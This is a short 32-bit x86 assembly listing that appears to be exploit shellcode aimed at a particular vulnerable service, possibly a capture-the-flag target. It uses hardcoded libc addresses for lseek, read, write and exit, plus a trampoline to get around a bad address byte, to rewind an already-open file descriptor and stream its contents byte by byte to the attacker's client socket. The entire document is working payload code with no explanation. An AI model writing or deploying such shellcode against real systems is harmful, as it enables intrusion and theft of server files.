bits 32


jmp short tgt
tramp:
push ebp
jmp eax
db 'AAAAAAAAA'
tgt:
pop eax
pop esi   ; client fd
xor eax, eax
push eax
push eax
mov al, 3
push eax
mov eax,0x07F7DED0   ; lseek
call eax
top:
mov  eax, esp
push byte 1
push eax
push byte 3
mov eax,0x7F7DE01  ; read+1
call tramp
test eax,eax
jle done
pop eax
push esi
mov eax,0x7F7DBF0  ; write
call eax
add esp, byte 12
jmp top
done:
mov eax,0x7F7C190 ; exit
jmp eax

